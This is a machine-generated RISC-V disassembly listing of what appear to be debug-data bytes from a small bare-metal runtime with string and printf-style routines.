    16c6:	0a00                	addi	s0,sp,272
    16c8:	061a                	slli	a2,a2,0x6
    16ca:	0000                	unimp
    16cc:	0919                	addi	s2,s2,6
    16ce:	0000                	unimp
    16d0:	0000790b          	0x790b
    16d4:	1800                	addi	s0,sp,48
    16d6:	2000                	fld	fs0,0(s0)
    16d8:	008e                	slli	ra,ra,0x3
    16da:	0000                	unimp
    16dc:	0812                	slli	a6,a6,0x4
    16de:	0919                	addi	s2,s2,6
    16e0:	0000                	unimp
    16e2:	2f21                	addiw	t5,t5,8
    16e4:	0009                	c.nop	2
    16e6:	1700                	addi	s0,sp,928
    16e8:	04c0                	addi	s0,sp,580
    16ea:	0000                	unimp
    16ec:	1200                	addi	s0,sp,288
    16ee:	2408                	fld	fa0,8(s0)
    16f0:	0009                	c.nop	2
    16f2:	1200                	addi	s0,sp,288
    16f4:	e108                	sd	a0,0(a0)
    16f6:	0001                	nop
    16f8:	2100                	fld	fs0,0(a0)
    16fa:	0946                	slli	s2,s2,0x11
    16fc:	0000                	unimp
    16fe:	00004917          	auipc	s2,0x4
    1702:	0000                	unimp
    1704:	0812                	slli	a6,a6,0x4
    1706:	094c                	addi	a1,sp,148
    1708:	0000                	unimp
    170a:	0812                	slli	a6,a6,0x4
    170c:	0000093b          	addw	s2,zero,zero
    1710:	b40a                	fsd	ft2,40(sp)
    1712:	0006                	c.slli	zero,0x1
    1714:	6200                	ld	s0,0(a2)
    1716:	0009                	c.nop	2
    1718:	0b00                	addi	s0,sp,400
    171a:	0079                	c.nop	30
    171c:	0000                	unimp
    171e:	0002                	c.slli	zero,0x0
    1720:	2b22                	fld	fs6,8(sp)
    1722:	0005                	c.nop	1
    1724:	0800                	addi	s0,sp,16
    1726:	c0170333          	0xc0170333
    172a:	0004                	0x4
    172c:	2200                	fld	fs0,0(a2)
    172e:	0524                	addi	s1,sp,648
    1730:	0000                	unimp
    1732:	3408                	fld	fa0,40(s0)
    1734:	04c61d03          	lh	s10,76(a2) # 604c <_tbss_end+0x5fc8>
    1738:	0000                	unimp
    173a:	f706                	sd	ra,424(sp)
    173c:	0006                	c.slli	zero,0x1
    173e:	0a00                	addi	s0,sp,272
    1740:	1b28                	addi	a0,sp,440
    1742:	015d                	addi	sp,sp,23
    1744:	0000                	unimp
    1746:	fe06                	sd	ra,312(sp)
    1748:	0006                	c.slli	zero,0x1
    174a:	0a00                	addi	s0,sp,272
    174c:	097c1863          	bne	s8,s7,17dc <_tbss_end+0x1758>
    1750:	0000                	unimp
    1752:	0008d223          	0x8d223
    1756:	0200                	addi	s0,sp,256
    1758:	00981a0f          	0x981a0f
    175c:	0000                	unimp
    175e:	00092623          	sw	zero,12(s2) # 570a <_tbss_end+0x5686>
    1762:	0200                	addi	s0,sp,256
    1764:	1a10                	addi	a2,sp,304
    1766:	0098                	addi	a4,sp,64
    1768:	0000                	unimp
    176a:	9d0a                	add	s10,s10,sp
    176c:	0000                	unimp
    176e:	bc00                	fsd	fs0,56(s0)
    1770:	0009                	c.nop	2
    1772:	0b00                	addi	s0,sp,400
    1774:	0079                	c.nop	30
    1776:	0000                	unimp
    1778:	0001                	nop
    177a:	2524                	fld	fs1,72(a0)
    177c:	02000007          	0x2000007
    1780:	1225                	addi	tp,tp,-23
    1782:	09ac                	addi	a1,sp,216
    1784:	0000                	unimp
    1786:	0309                	addi	t1,t1,2
    1788:	bc40                	fsd	fs0,184(s0)
    178a:	8001                	srli	s0,s0,0x0
    178c:	0000                	unimp
    178e:	0000                	unimp
    1790:	140a                	slli	s0,s0,0x22
    1792:	0006                	c.slli	zero,0x1
    1794:	e200                	sd	s0,0(a2)
    1796:	0009                	c.nop	2
    1798:	0b00                	addi	s0,sp,400
    179a:	0079                	c.nop	30
    179c:	0000                	unimp
    179e:	0001                	nop
    17a0:	4424                	lw	s1,72(s0)
    17a2:	0008                	0x8
    17a4:	0200                	addi	s0,sp,256
    17a6:	0e26                	slli	t3,t3,0x9
    17a8:	09d2                	slli	s3,s3,0x14
    17aa:	0000                	unimp
    17ac:	0309                	addi	t1,t1,2
    17ae:	bc50                	fsd	fa2,184(s0)
    17b0:	8001                	srli	s0,s0,0x0
    17b2:	0000                	unimp
    17b4:	0000                	unimp
    17b6:	4825                	li	a6,9
    17b8:	0009                	c.nop	2
    17ba:	0200                	addi	s0,sp,256
    17bc:	660601c3          	fmadd.q	ft3,fa2,ft0,fa2,rne
    17c0:	0000                	unimp
    17c2:	e000                	sd	s0,0(s0)
    17c4:	0026                	c.slli	zero,0x9
    17c6:	0080                	addi	s0,sp,64
    17c8:	0000                	unimp
    17ca:	dc00                	sw	s0,56(s0)
    17cc:	0000                	unimp
    17ce:	0000                	unimp
    17d0:	0000                	unimp
    17d2:	0100                	addi	s0,sp,128
    17d4:	4c9c                	lw	a5,24(s1)
    17d6:	000a                	c.slli	zero,0x2
    17d8:	2600                	fld	fs0,8(a2)
    17da:	00727473          	csrrci	s0,0x7,4
    17de:	c302                	sw	zero,132(sp)
    17e0:	1701                	addi	a4,a4,-32
    17e2:	064a                	slli	a2,a2,0x12
    17e4:	0000                	unimp
    17e6:	9102                	jalr	sp
    17e8:	2758                	fld	fa4,136(a4)
    17ea:	6572                	ld	a0,280(sp)
    17ec:	c5020073          	0xc5020073
    17f0:	0801                	addi	a6,a6,0
    17f2:	0066                	c.slli	zero,0x19
    17f4:	0000                	unimp
    17f6:	9102                	jalr	sp
    17f8:	2868                	fld	fa0,208(s0)
    17fa:	01a6                	slli	gp,gp,0x9
    17fc:	0000                	unimp
    17fe:	c602                	sw	zero,12(sp)
    1800:	0701                	addi	a4,a4,0
    1802:	0049                	c.nop	18
    1804:	0000                	unimp
    1806:	9102                	jalr	sp
    1808:	0064                	addi	s1,sp,12
    180a:	da29                	beqz	a2,175c <_tbss_end+0x16d8>
    180c:	0006                	c.slli	zero,0x1
    180e:	0b00                	addi	s0,sp,400
    1810:	0826                	slli	a6,a6,0x9
    1812:	0614                	addi	a3,sp,768
    1814:	0000                	unimp
    1816:	2696                	fld	fa3,320(sp)
    1818:	8000                	0x8000
    181a:	0000                	unimp
    181c:	0000                	unimp
    181e:	004a                	c.slli	zero,0x12
    1820:	0000                	unimp
    1822:	0000                	unimp
    1824:	0000                	unimp
    1826:	9c01                	subw	s0,s0,s0
    1828:	0a9d                	addi	s5,s5,7
    182a:	0000                	unimp
    182c:	662a                	ld	a2,136(sp)
    182e:	0009                	c.nop	2
    1830:	0200                	addi	s0,sp,256
    1832:	141401bb          	0x141401bb
    1836:	0006                	c.slli	zero,0x1
    1838:	0200                	addi	s0,sp,256
    183a:	5891                	li	a7,-28
    183c:	7326                	ld	t1,104(sp)
    183e:	6372                	ld	t1,280(sp)
    1840:	0200                	addi	s0,sp,256
    1842:	4a2601bb          	0x4a2601bb
    1846:	0006                	c.slli	zero,0x1
    1848:	0200                	addi	s0,sp,256
    184a:	5091                	li	ra,-28
    184c:	02006427          	0x2006427
    1850:	01bd                	addi	gp,gp,15
    1852:	1409                	addi	s0,s0,-30
    1854:	0006                	c.slli	zero,0x1
    1856:	0200                	addi	s0,sp,256
    1858:	6891                	lui	a7,0x4
    185a:	2900                	fld	fs0,16(a0)
    185c:	0779                	addi	a4,a4,30
    185e:	0000                	unimp
    1860:	4906240b          	0x4906240b
    1864:	0000                	unimp
    1866:	2600                	fld	fs0,8(a2)
    1868:	0026                	c.slli	zero,0x9
    186a:	0080                	addi	s0,sp,64
    186c:	0000                	unimp
    186e:	7000                	ld	s0,32(s0)
    1870:	0000                	unimp
    1872:	0000                	unimp
    1874:	0000                	unimp
    1876:	0100                	addi	s0,sp,128
    1878:	fc9c                	sd	a5,56(s1)
    187a:	000a                	c.slli	zero,0x2
    187c:	2600                	fld	fs0,8(a2)
    187e:	02003173          	csrrc	sp,0x20,zero
    1882:	4a1801af          	0x4a1801af
    1886:	0006                	c.slli	zero,0x1
    1888:	0200                	addi	s0,sp,256
    188a:	5891                	li	a7,-28
    188c:	7326                	ld	t1,104(sp)
    188e:	0032                	c.slli	zero,0xc
    1890:	af02                	fsd	ft0,408(sp)
    1892:	2801                	sext.w	a6,a6
    1894:	064a                	slli	a2,a2,0x12
    1896:	0000                	unimp
    1898:	9102                	jalr	sp
    189a:	2750                	fld	fa2,136(a4)
    189c:	02003163          	0x2003163
    18a0:	01b1                	addi	gp,gp,12
    18a2:	3411                	addiw	s0,s0,-28
    18a4:	0000                	unimp
    18a6:	0200                	addi	s0,sp,256
    18a8:	6f91                	lui	t6,0x4
    18aa:	00326327          	0x326327
    18ae:	b102                	fsd	ft0,160(sp)
    18b0:	1501                	addi	a0,a0,-32
    18b2:	0034                	addi	a3,sp,8
    18b4:	0000                	unimp
    18b6:	9102                	jalr	sp
    18b8:	006e                	c.slli	zero,0x1b
    18ba:	6b29                	lui	s6,0xa
    18bc:	0006                	c.slli	zero,0x1
    18be:	0b00                	addi	s0,sp,400
    18c0:	00ae0977          	0xae0977
    18c4:	0000                	unimp
    18c6:	25d8                	fld	fa4,136(a1)
    18c8:	8000                	0x8000
    18ca:	0000                	unimp
    18cc:	0000                	unimp
    18ce:	004e                	c.slli	zero,0x13
    18d0:	0000                	unimp
    18d2:	0000                	unimp
    18d4:	0000                	unimp
    18d6:	9c01                	subw	s0,s0,s0
    18d8:	0b49                	addi	s6,s6,18
    18da:	0000                	unimp
    18dc:	7326                	ld	t1,104(sp)
    18de:	0200                	addi	s0,sp,256
    18e0:	4a1c01a7          	0x4a1c01a7
    18e4:	0006                	c.slli	zero,0x1
    18e6:	0200                	addi	s0,sp,256
    18e8:	5891                	li	a7,-28
    18ea:	6e26                	ld	t3,72(sp)
    18ec:	0200                	addi	s0,sp,256
    18ee:	ae2601a7          	0xae2601a7
    18f2:	0000                	unimp
    18f4:	0200                	addi	s0,sp,256
    18f6:	5091                	li	ra,-28
    18f8:	02007027          	0x2007027
    18fc:	01a9                	addi	gp,gp,10
    18fe:	00064a0f          	0x64a0f
    1902:	0200                	addi	s0,sp,256
    1904:	6891                	lui	a7,0x4
    1906:	2900                	fld	fs0,16(a0)
    1908:	00000653          	fadd.s	fa2,ft0,ft0,rne
    190c:	ae09290b          	0xae09290b
    1910:	0000                	unimp
    1912:	9c00                	0x9c00
    1914:	0025                	c.nop	9
    1916:	0080                	addi	s0,sp,64
    1918:	0000                	unimp
    191a:	3c00                	fld	fs0,56(s0)
    191c:	0000                	unimp
    191e:	0000                	unimp
    1920:	0000                	unimp
    1922:	0100                	addi	s0,sp,128
    1924:	889c                	0x889c
    1926:	2600000b          	0x2600000b
    192a:	9f020073          	0x9f020073
    192e:	1b01                	addi	s6,s6,-32
    1930:	064a                	slli	a2,a2,0x12
    1932:	0000                	unimp
    1934:	9102                	jalr	sp
    1936:	2758                	fld	fa4,136(a4)
    1938:	0070                	addi	a2,sp,12
    193a:	a102                	fsd	ft0,128(sp)
    193c:	0f01                	addi	t5,t5,0
    193e:	064a                	slli	a2,a2,0x12
    1940:	0000                	unimp
    1942:	9102                	jalr	sp
    1944:	0068                	addi	a0,sp,12
    1946:	9c29                	addw	s0,s0,a0
    1948:	0b000007          	0xb000007
    194c:	0921                	addi	s2,s2,8
    194e:	0000015b          	0x15b
    1952:	24ce                	fld	fs1,208(sp)
    1954:	8000                	0x8000
    1956:	0000                	unimp
    1958:	0000                	unimp
    195a:	00ce                	slli	ra,ra,0x13
    195c:	0000                	unimp
    195e:	0000                	unimp
    1960:	0000                	unimp
    1962:	9c01                	subw	s0,s0,s0
    1964:	0c30                	addi	a2,sp,536
    1966:	0000                	unimp
    1968:	662a                	ld	a2,136(sp)
    196a:	0009                	c.nop	2
    196c:	0200                	addi	s0,sp,256
    196e:	018c                	addi	a1,sp,192
    1970:	5b14                	lw	a3,48(a4)
    1972:	0001                	nop
    1974:	0200                	addi	s0,sp,256
    1976:	4891                	li	a7,4
    1978:	ec2a                	sd	a0,24(sp)
    197a:	0008                	0x8
    197c:	0200                	addi	s0,sp,256
    197e:	018c                	addi	a1,sp,192
    1980:	491e                	lw	s2,196(sp)
    1982:	0000                	unimp
    1984:	0200                	addi	s0,sp,256
    1986:	4491                	li	s1,4
    1988:	6c26                	ld	s8,72(sp)
    198a:	6e65                	lui	t3,0x19
    198c:	0200                	addi	s0,sp,256
    198e:	018c                	addi	a1,sp,192
    1990:	0000ae2b          	0xae2b
    1994:	0300                	addi	s0,sp,384
    1996:	b891                	j	11ea <_tbss_end+0x1166>
    1998:	2b7f                	0x2b7f
    199a:	24f0                	fld	fa2,200(s1)
    199c:	8000                	0x8000
    199e:	0000                	unimp
    19a0:	0000                	unimp
    19a2:	006c                	addi	a1,sp,12
    19a4:	0000                	unimp
    19a6:	0000                	unimp
    19a8:	0000                	unimp
    19aa:	00000c0f          	0xc0f
    19ae:	5228                	lw	a0,96(a2)
    19b0:	0008                	0x8
    19b2:	0200                	addi	s0,sp,256
    19b4:	9d0f018f          	0x9d0f018f
    19b8:	0000                	unimp
    19ba:	0200                	addi	s0,sp,256
    19bc:	5891                	li	a7,-28
    19be:	02006427          	0x2006427
    19c2:	0194                	addi	a3,sp,192
    19c4:	3010                	fld	fa2,32(s0)
    19c6:	000c                	0xc
    19c8:	0200                	addi	s0,sp,256
    19ca:	6891                	lui	a7,0x4
    19cc:	2c00                	fld	fs0,24(s0)
    19ce:	255c                	fld	fa5,136(a0)
    19d0:	8000                	0x8000
    19d2:	0000                	unimp
    19d4:	0000                	unimp
    19d6:	0034                	addi	a3,sp,8
    19d8:	0000                	unimp
    19da:	0000                	unimp
    19dc:	0000                	unimp
    19de:	02006427          	0x2006427
    19e2:	0198                	addi	a4,sp,192
    19e4:	0006140b          	0x6140b
    19e8:	0200                	addi	s0,sp,256
    19ea:	6091                	lui	ra,0x4
    19ec:	0000                	unimp
    19ee:	0812                	slli	a6,a6,0x4
    19f0:	009d                	addi	ra,ra,7
    19f2:	0000                	unimp
    19f4:	2f29                	addiw	t5,t5,10
    19f6:	0009                	c.nop	2
    19f8:	0b00                	addi	s0,sp,400
    19fa:	091f 015b 0000      	0x15b091f
    1a00:	2416                	fld	fs0,320(sp)
    1a02:	8000                	0x8000
    1a04:	0000                	unimp
    1a06:	0000                	unimp
    1a08:	00b8                	addi	a4,sp,72
    1a0a:	0000                	unimp
    1a0c:	0000                	unimp
    1a0e:	0000                	unimp
    1a10:	9c01                	subw	s0,s0,s0
    1a12:	0cea                	slli	s9,s9,0x1a
    1a14:	0000                	unimp
    1a16:	662a                	ld	a2,136(sp)
    1a18:	0009                	c.nop	2
    1a1a:	0200                	addi	s0,sp,256
    1a1c:	017c                	addi	a5,sp,140
    1a1e:	5b14                	lw	a3,48(a4)
    1a20:	0001                	nop
    1a22:	0200                	addi	s0,sp,256
    1a24:	4891                	li	a7,4
    1a26:	7326                	ld	t1,104(sp)
    1a28:	6372                	ld	t1,280(sp)
    1a2a:	0200                	addi	s0,sp,256
    1a2c:	017c                	addi	a5,sp,140
    1a2e:	ea26                	sd	s1,272(sp)
    1a30:	000c                	0xc
    1a32:	0200                	addi	s0,sp,256
    1a34:	4091                	li	ra,4
    1a36:	6c26                	ld	s8,72(sp)
    1a38:	6e65                	lui	t3,0x19
    1a3a:	0200                	addi	s0,sp,256
    1a3c:	017c                	addi	a5,sp,140
    1a3e:	ae32                	fsd	fa2,280(sp)
    1a40:	0000                	unimp
    1a42:	0300                	addi	s0,sp,384
    1a44:	b891                	j	1298 <_tbss_end+0x1214>
    1a46:	2b7f                	0x2b7f
    1a48:	243c                	fld	fa5,72(s0)
    1a4a:	8000                	0x8000
    1a4c:	0000                	unimp
    1a4e:	0000                	unimp
    1a50:	0042                	c.slli	zero,0x10
    1a52:	0000                	unimp
    1a54:	0000                	unimp
    1a56:	0000                	unimp
    1a58:	00000cbb          	addw	s9,zero,zero
    1a5c:	02007327          	0x2007327
    1a60:	017f                	0x17f
    1a62:	f116                	sd	t0,160(sp)
    1a64:	000c                	0xc
    1a66:	0200                	addi	s0,sp,256
    1a68:	6891                	lui	a7,0x4
    1a6a:	02006427          	0x2006427
    1a6e:	0180                	addi	s0,sp,192
    1a70:	3010                	fld	fa2,32(s0)
    1a72:	000c                	0xc
    1a74:	0200                	addi	s0,sp,256
    1a76:	6091                	lui	ra,0x4
    1a78:	2c00                	fld	fs0,24(s0)
    1a7a:	247e                	fld	fs0,472(sp)
    1a7c:	8000                	0x8000
    1a7e:	0000                	unimp
    1a80:	0000                	unimp
    1a82:	0044                	addi	s1,sp,4
    1a84:	0000                	unimp
    1a86:	0000                	unimp
    1a88:	0000                	unimp
    1a8a:	02007327          	0x2007327
    1a8e:	0184                	addi	s1,sp,192
    1a90:	4a11                	li	s4,4
    1a92:	0006                	c.slli	zero,0x1
    1a94:	0200                	addi	s0,sp,256
    1a96:	5891                	li	a7,-28
    1a98:	02006427          	0x2006427
    1a9c:	0185                	addi	gp,gp,1
    1a9e:	0006140b          	0x6140b
    1aa2:	0200                	addi	s0,sp,256
    1aa4:	5091                	li	ra,-28
    1aa6:	0000                	unimp
    1aa8:	0812                	slli	a6,a6,0x4
    1aaa:	0cf0                	addi	a2,sp,604
    1aac:	0000                	unimp
    1aae:	122d                	addi	tp,tp,-21
    1ab0:	a908                	fsd	fa0,16(a0)
    1ab2:	0000                	unimp
    1ab4:	2e00                	fld	fs0,24(a2)
    1ab6:	000007fb          	0x7fb
    1aba:	4905f403          	0x4905f403
    1abe:	0000                	unimp
    1ac0:	5400                	lw	s0,40(s0)
    1ac2:	00800023          	sb	s0,0(zero) # 0 <_tdata_begin>
    1ac6:	0000                	unimp
    1ac8:	c200                	sw	s0,0(a2)
    1aca:	0000                	unimp
    1acc:	0000                	unimp
    1ace:	0000                	unimp
    1ad0:	0100                	addi	s0,sp,128
    1ad2:	b19c                	fsd	fa5,32(a1)
    1ad4:	000d                	c.nop	3
    1ad6:	2600                	fld	fs0,8(a2)
    1ad8:	00727473          	csrrci	s0,0x7,4
    1adc:	6802                	ld	a6,0(sp)
    1ade:	1301                	addi	t1,t1,-32
    1ae0:	0614                	addi	a3,sp,768
    1ae2:	0000                	unimp
    1ae4:	7e889103          	lh	sp,2024(a7) # 47e8 <_tbss_end+0x4764>
    1ae8:	6626                	ld	a2,72(sp)
    1aea:	746d                	lui	s0,0xffffb
    1aec:	0200                	addi	s0,sp,256
    1aee:	0168                	addi	a0,sp,140
    1af0:	4a24                	lw	s1,80(a2)
    1af2:	0006                	c.slli	zero,0x1
    1af4:	0300                	addi	s0,sp,384
    1af6:	8091                	srli	s1,s1,0x4
    1af8:	2f7e                	fld	ft10,472(sp)
    1afa:	00706127          	0x706127
    1afe:	6a02                	ld	s4,0(sp)
    1b00:	0b01                	addi	s6,s6,0
    1b02:	0988                	addi	a0,sp,208
    1b04:	0000                	unimp
    1b06:	7fb09103          	lh	sp,2043(ra) # 47fb <_tbss_end+0x4777>
    1b0a:	2028                	fld	fa0,64(s0)
    1b0c:	02000007          	0x2000007
    1b10:	1409016b          	0x1409016b
    1b14:	0006                	c.slli	zero,0x1
    1b16:	0300                	addi	s0,sp,384
    1b18:	b891                	j	136c <_tbss_end+0x12e8>
    1b1a:	307f                	0x307f
    1b1c:	08de                	slli	a7,a7,0x17
    1b1e:	0000                	unimp
    1b20:	6e02                	ld	t3,0(sp)
    1b22:	0801                	addi	a6,a6,0
    1b24:	230e                	fld	ft6,192(sp)
    1b26:	8000                	0x8000
    1b28:	0000                	unimp
    1b2a:	0000                	unimp
    1b2c:	0046                	c.slli	zero,0x11
    1b2e:	0000                	unimp
    1b30:	0000                	unimp
    1b32:	0000                	unimp
    1b34:	9c01                	subw	s0,s0,s0
    1b36:	06489107          	0x6489107
    1b3a:	06019023          	sh	zero,96(gp) # 800033c0 <__global_pointer$+0x60>
    1b3e:	6326                	ld	t1,72(sp)
    1b40:	0068                	addi	a0,sp,12
    1b42:	6e02                	ld	t3,0(sp)
    1b44:	1a01                	addi	s4,s4,-32
    1b46:	0049                	c.nop	18
    1b48:	0000                	unimp
    1b4a:	9102                	jalr	sp
    1b4c:	2a5c                	fld	fa5,144(a2)
    1b4e:	064e                	slli	a2,a2,0x13
    1b50:	0000                	unimp
    1b52:	6e02                	ld	t3,0(sp)
    1b54:	2501                	sext.w	a0,a0
    1b56:	0db1                	addi	s11,s11,12
    1b58:	0000                	unimp
    1b5a:	9102                	jalr	sp
    1b5c:	2850                	fld	fa2,144(s0)
    1b5e:	00000797          	auipc	a5,0x0
    1b62:	7002                	0x7002
    1b64:	0c01                	addi	s8,s8,0
    1b66:	00000db7          	lui	s11,0x0
    1b6a:	9102                	jalr	sp
    1b6c:	0068                	addi	a0,sp,12
    1b6e:	1200                	addi	s0,sp,288
    1b70:	5b08                	lw	a0,48(a4)
    1b72:	0001                	nop
    1b74:	1200                	addi	s0,sp,288
    1b76:	1408                	addi	a0,sp,544
    1b78:	0006                	c.slli	zero,0x1
    1b7a:	2e00                	fld	fs0,24(a2)
    1b7c:	000008cb          	fnmsub.s	fa7,ft0,ft0,ft0,rne
    1b80:	4905c803          	lbu	a6,1168(a1)
    1b84:	0000                	unimp
    1b86:	b800                	fsd	fs0,48(s0)
    1b88:	0022                	c.slli	zero,0x8
    1b8a:	0080                	addi	s0,sp,64
    1b8c:	0000                	unimp
    1b8e:	5600                	lw	s0,40(a2)
    1b90:	0000                	unimp
    1b92:	0000                	unimp
    1b94:	0000                	unimp
    1b96:	0100                	addi	s0,sp,128
    1b98:	029c                	addi	a5,sp,320
    1b9a:	000e                	c.slli	zero,0x3
    1b9c:	2600                	fld	fs0,8(a2)
    1b9e:	6d66                	ld	s10,88(sp)
    1ba0:	0074                	addi	a3,sp,12
    1ba2:	5d02                	lw	s10,32(sp)
    1ba4:	1801                	addi	a6,a6,-32
    1ba6:	064a                	slli	a2,a2,0x12
    1ba8:	0000                	unimp
    1baa:	7f989103          	lh	sp,2041(a7)
    1bae:	7061272f          	0x7061272f
    1bb2:	0200                	addi	s0,sp,256
    1bb4:	015f 880b 0009      	0x9880b015f
    1bba:	0300                	addi	s0,sp,384
    1bbc:	a891                	j	1c10 <_tbss_end+0x1b8c>
    1bbe:	007f                	0x7f
    1bc0:	6b31                	lui	s6,0xc
    1bc2:	0009                	c.nop	2
    1bc4:	0200                	addi	s0,sp,256
    1bc6:	0dc6                	slli	s11,s11,0x11
    1bc8:	1f5a                	slli	t5,t5,0x36
    1bca:	8000                	0x8000
    1bcc:	0000                	unimp
    1bce:	0000                	unimp
    1bd0:	035e                	slli	t1,t1,0x17
    1bd2:	0000                	unimp
    1bd4:	0000                	unimp
    1bd6:	0000                	unimp
    1bd8:	9c01                	subw	s0,s0,s0
    1bda:	0f42                	slli	t5,t5,0x10
    1bdc:	0000                	unimp
    1bde:	e632                	sd	a2,264(sp)
    1be0:	0008                	0x8
    1be2:	0200                	addi	s0,sp,256
    1be4:	1ec6                	slli	t4,t4,0x31
    1be6:	0f52                	slli	t5,t5,0x14
    1be8:	0000                	unimp
    1bea:	7fa89103          	lh	sp,2042(a7)
    1bee:	e432                	sd	a2,8(sp)
    1bf0:	02000007          	0x2000007
    1bf4:	3ac6                	fld	fs5,112(sp)
    1bf6:	0db1                	addi	s11,s11,12
    1bf8:	0000                	unimp
    1bfa:	7fa09103          	lh	sp,2042(ra)
    1bfe:	746d6633          	0x746d6633
    1c02:	0200                	addi	s0,sp,256
    1c04:	4ec6                	lw	t4,80(sp)
    1c06:	064a                	slli	a2,a2,0x12
    1c08:	0000                	unimp
    1c0a:	7f989103          	lh	sp,2041(a7)
    1c0e:	00706133          	or	sp,zero,t2
    1c12:	c602                	sw	zero,12(sp)
    1c14:	0009885b          	0x9885b
    1c18:	0300                	addi	s0,sp,384
    1c1a:	9091                	srli	s1,s1,0x24
    1c1c:	347f                	0x347f
    1c1e:	0070                	addi	a2,sp,12
    1c20:	c802                	sw	zero,16(sp)
    1c22:	4a18                	lw	a4,16(a2)
    1c24:	0006                	c.slli	zero,0x1
    1c26:	0100                	addi	s0,sp,128
    1c28:	2462                	fld	fs0,24(sp)
    1c2a:	0760                	addi	s0,sp,908
    1c2c:	0000                	unimp
    1c2e:	c902                	sw	zero,144(sp)
    1c30:	00064a0f          	0x64a0f
    1c34:	0300                	addi	s0,sp,384
    1c36:	b891                	j	148a <_tbss_end+0x1406>
    1c38:	347f                	0x347f
    1c3a:	02006863          	bltu	zero,zero,1c6a <_tbss_end+0x1be6>
    1c3e:	10ca                	slli	ra,ra,0x32
    1c40:	0049                	c.nop	18
    1c42:	0000                	unimp
    1c44:	5901                	li	s2,-32
    1c46:	6535                	lui	a0,0xd
    1c48:	7272                	ld	tp,312(sp)
    1c4a:	0200                	addi	s0,sp,256
    1c4c:	14ca                	slli	s1,s1,0x32
    1c4e:	0049                	c.nop	18
    1c50:	0000                	unimp
    1c52:	6e34                	ld	a3,88(a2)
    1c54:	6d75                	lui	s10,0x1d
    1c56:	0200                	addi	s0,sp,256
    1c58:	087416cb          	fnmsub.s	fa3,fs0,ft7,ft1,rtz
    1c5c:	0000                	unimp
    1c5e:	9102                	jalr	sp
    1c60:	2458                	fld	fa4,136(s0)
    1c62:	000000e7          	jalr	zero
    1c66:	cc02                	sw	zero,24(sp)
    1c68:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1c6c:	0200                	addi	s0,sp,256
    1c6e:	5491                	li	s1,-28
    1c70:	9124                	0x9124
    1c72:	02000007          	0x2000007
    1c76:	0dcc                	addi	a1,sp,724
    1c78:	0049                	c.nop	18
    1c7a:	0000                	unimp
    1c7c:	9102                	jalr	sp
    1c7e:	2450                	fld	fa2,136(s0)
    1c80:	071a                	slli	a4,a4,0x6
    1c82:	0000                	unimp
    1c84:	cc02                	sw	zero,24(sp)
    1c86:	4914                	lw	a3,16(a0)
    1c88:	0000                	unimp
    1c8a:	0200                	addi	s0,sp,256
    1c8c:	4c91                	li	s9,4
    1c8e:	7b24                	ld	s1,112(a4)
    1c90:	0006                	c.slli	zero,0x1
    1c92:	0200                	addi	s0,sp,256
    1c94:	1bcc                	addi	a1,sp,500
    1c96:	0049                	c.nop	18
    1c98:	0000                	unimp
    1c9a:	9102                	jalr	sp
    1c9c:	2448                	fld	fa0,136(s0)
    1c9e:	00000823          	sb	zero,16(zero) # 10 <_tdata_begin+0x10>
    1ca2:	cc02                	sw	zero,24(sp)
    1ca4:	4926                	lw	s2,72(sp)
    1ca6:	0000                	unimp
    1ca8:	0300                	addi	s0,sp,384
    1caa:	b491                	j	16ee <_tbss_end+0x166a>
    1cac:	247f                	0x247f
    1cae:	0706                	slli	a4,a4,0x1
    1cb0:	0000                	unimp
    1cb2:	cd02                	sw	zero,152(sp)
    1cb4:	1a08                	addi	a0,sp,304
    1cb6:	0006                	c.slli	zero,0x1
    1cb8:	0200                	addi	s0,sp,256
    1cba:	4791                	li	a5,4
    1cbc:	7036                	0x7036
    1cbe:	02000007          	0x2000007
    1cc2:	03df 1fd6 8000      	0x80001fd603df
    1cc8:	0000                	unimp
    1cca:	0000                	unimp
    1ccc:	00067337          	lui	t1,0x67
    1cd0:	0200                	addi	s0,sp,256
    1cd2:	b005010b          	0xb005010b
    1cd6:	0020                	addi	s0,sp,8
    1cd8:	0080                	addi	s0,sp,64
    1cda:	0000                	unimp
    1cdc:	3700                	fld	fs0,40(a4)
    1cde:	07d6                	slli	a5,a5,0x15
    1ce0:	0000                	unimp
    1ce2:	4b02                	lw	s6,0(sp)
    1ce4:	0501                	addi	a0,a0,0
    1ce6:	2262                	fld	ft4,24(sp)
    1ce8:	8000                	0x8000
    1cea:	0000                	unimp
    1cec:	0000                	unimp
    1cee:	0007d437          	lui	s0,0x7d
    1cf2:	0200                	addi	s0,sp,256
    1cf4:	0149                	addi	sp,sp,18
    1cf6:	4e05                	li	t3,1
    1cf8:	0022                	c.slli	zero,0x8
    1cfa:	0080                	addi	s0,sp,64
    1cfc:	0000                	unimp
    1cfe:	0000                	unimp
    1d00:	5221                	li	tp,-24
    1d02:	1700000f          	0x1700000f
    1d06:	0049                	c.nop	18
    1d08:	0000                	unimp
    1d0a:	000db117          	auipc	sp,0xdb
    1d0e:	0000                	unimp
    1d10:	0812                	slli	a6,a6,0x4
    1d12:	0f42                	slli	t5,t5,0x10
    1d14:	0000                	unimp
    1d16:	cd38                	sw	a4,88(a0)
    1d18:	02000007          	0x2000007
    1d1c:	12bc                	addi	a5,sp,360
    1d1e:	00ba                	slli	ra,ra,0xe
    1d20:	0000                	unimp
    1d22:	1ef2                	slli	t4,t4,0x3c
    1d24:	8000                	0x8000
    1d26:	0000                	unimp
    1d28:	0000                	unimp
    1d2a:	0068                	addi	a0,sp,12
    1d2c:	0000                	unimp
    1d2e:	0000                	unimp
    1d30:	0000                	unimp
    1d32:	9c01                	subw	s0,s0,s0
    1d34:	0f98                	addi	a4,sp,976
    1d36:	0000                	unimp
    1d38:	00706133          	or	sp,zero,t2
    1d3c:	bc02                	fsd	ft0,56(sp)
    1d3e:	9822                	add	a6,a6,s0
    1d40:	0200000f          	fence	r,unknown
    1d44:	6891                	lui	a7,0x4
    1d46:	9132                	add	sp,sp,a2
    1d48:	02000007          	0x2000007
    1d4c:	2abc                	fld	fa5,80(a3)
    1d4e:	0049                	c.nop	18
    1d50:	0000                	unimp
    1d52:	9102                	jalr	sp
    1d54:	0064                	addi	s1,sp,12
    1d56:	0812                	slli	a6,a6,0x4
    1d58:	0988                	addi	a0,sp,208
    1d5a:	0000                	unimp
    1d5c:	9b38                	0x9b38
    1d5e:	0006                	c.slli	zero,0x1
    1d60:	0200                	addi	s0,sp,256
    1d62:	1bb2                	slli	s7,s7,0x2c
    1d64:	0874                	addi	a3,sp,28
    1d66:	0000                	unimp
    1d68:	1e86                	slli	t4,t4,0x21
    1d6a:	8000                	0x8000
    1d6c:	0000                	unimp
